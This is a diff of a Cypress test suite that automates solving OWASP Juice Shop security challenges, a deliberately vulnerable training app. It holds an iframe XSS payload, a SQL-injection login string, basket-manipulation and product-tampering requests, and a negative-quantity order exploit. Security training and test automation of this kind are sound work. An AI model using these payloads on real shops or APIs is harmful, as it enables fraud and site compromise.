@@ -4,7 +4,9 @@ import resetPassword from '../POM/resetPassword.pom';
 import sideNav from '../POM/sideNav.pom';
 import loginPage from '../POM/loginPage.pom';
 import complaint from '../POM/complaint.pom';
-import products from '../POM/products.pom'
+import products from '../POM/products.pom';
+import orders from '../POM/orders.pom';
+import headerBar from '../POM/headerBar.pom';
 
 describe('OWASP JuiceShop Achivments unlocking Automation', () => {
   context('3 - stars vulnerabilities', () => {
@@ -66,26 +68,27 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
 
     it.skip('4 - Client-side XSS Protection', () => {
       //This challenge is not available on Docker!
-      const email = registrationPage.userEmail;
       const password = registrationPage.userPassword;
-      cy.request({
-        method: 'POST',
-        url: '/api/Users/',
-        headers: {
-          'content-type': 'application/json'
-        },
-        body: {
-          "email": "<iframe src=\"javascript:alert(`xss`)\">",
-          "password": password,
-          "passwordRepeat": password,
-          "securityQuestion": {
-            "id": 1,
-            "question": "Your eldest siblings middle name?",
-            "createdAt": "2021-05-15T07:36:16.600Z",
-            "updatedAt": "2020-05-15T07:36:16.600Z"
+      cy.fixture('challengesPayloads.json').then(data => {
+        cy.request({
+          method: 'POST',
+          url: '/api/Users/',
+          headers: {
+            'content-type': 'application/json'
           },
-          "securityAnswer": "1"
-        }
+          body: {
+            "email": data.XSS,
+            "password": password,
+            "passwordRepeat": password,
+            "securityQuestion": {
+              "id": 1,
+              "question": "Your eldest siblings middle name?",
+              "createdAt": "2021-05-15T07:36:16.600Z",
+              "updatedAt": "2020-05-15T07:36:16.600Z"
+            },
+            "securityAnswer": "1"
+          }
+        });
       });
       cy.checkIsAchivSolvedXHR('Client-side XSS Protection');
     });
@@ -177,13 +180,15 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
 
     it.skip('13 - API-only XSS', () => {
       //This challenge is not available on Docker!
-      cy.request({
-        method: 'PUT',
-        url: '/rest/products/24/reviews',
-        body: {
-          messege: "<iframe src=\"javascript:alert(`xss`)\">",
-          author: "Anonymous"
-        }
+      cy.fixture('challengesPayloads.json').then(data => {
+        cy.request({
+          method: 'PUT',
+          url: '/rest/products/24/reviews',
+          body: {
+            messege: data.XSS,
+            author: "Anonymous"
+          }
+        });
       });
       cy.checkIsAchivSolvedXHR("API-only XSS");
     });
@@ -193,6 +198,81 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
       const email = "chris.pike@juice-sh.op'--";
       loginPage.login(email, newPassword);
       cy.checkIsAchivSolvedXHR("GDPR Data Erasure");
+    });
+
+    it.skip('15 - Manipulate Basket', () => {
+      //This solution is not available on cypress!
+      registrationPage.register();
+      loginPage.login();
+      products.addToBasket('Apple Juice');
+      cy.wait('@postBasketItems').then((postBasket) => {
+        cy.request({
+          method: 'POST',
+          url: postBasket.request.url,
+          headers: {
+            'authorization': postBasket.request.headers.authorization
+          },
+          body: {
+            BasketId: postBasket.request.body.BasketId,
+            BasketId: postBasket.request.body.BasketId - 1,
+            ProductId: postBasket.request.body.ProductId,
+            quantity: postBasket.request.body.quantity
+          }
+          , failOnStatusCode: false
+        });
+      });
+      cy.checkIsAchivSolvedXHR("Manipulate Basket");
+    });
+
+    it('16 - Product tempering', () => {
+      cy.request({
+        method: 'GET',
+        url: '/rest/admin/application-configuration'
+      }).as('appConfig');
+      registrationPage.register();
+      loginPage.login();
+      products.addToBasket('Apple Juice');
+      cy.wait('@postBasketItems').then((postBasket) => {
+        cy.get('@appConfig').then((appConfig) => {
+          cy.log(appConfig.body.config.products)
+          const productsArr = appConfig.body.config.products;
+          const oSaftProductId = productsArr.indexOf(productsArr.find(product => product.name === 'OWASP SSL Advanced Forensic Tool (O-Saft)')) + 1;
+          cy.request({
+            method: 'PUT',
+            url: `/api/Products/${oSaftProductId}`,
+            headers: {
+              'authorization': postBasket.request.headers.authorization
+            },
+            body: {
+              description: '<a href="https://owasp.slack.com" target="_blank">More...</a>'
+            }
+          });
+        });
+      });
+      cy.checkIsAchivSolvedXHR("Product Tampering");
+    });
+
+    it('17 - Payback Time', () => {
+      registrationPage.register();
+      loginPage.login();
+      orders.addNewAddress();
+      products.addToBasket('Apple Juice');
+      headerBar.navigateToBasket().then((basket) => {
+        const basketItemId = basket.response.body.data.Products[0].BasketItem.id;
+        cy.request({
+          method: 'PUT',
+          url: `/api/BasketItems/${basketItemId}`,
+          headers: {
+            'authorization': basket.request.headers.authorization
+          },
+          body: {
+            quantity: -99
+          }
+        });
+      });
+      cy.reload();
+      orders.placeOrder();
+      cy.checkIsAchivSolvedXHR("Payback Time");
     });
   });
 });
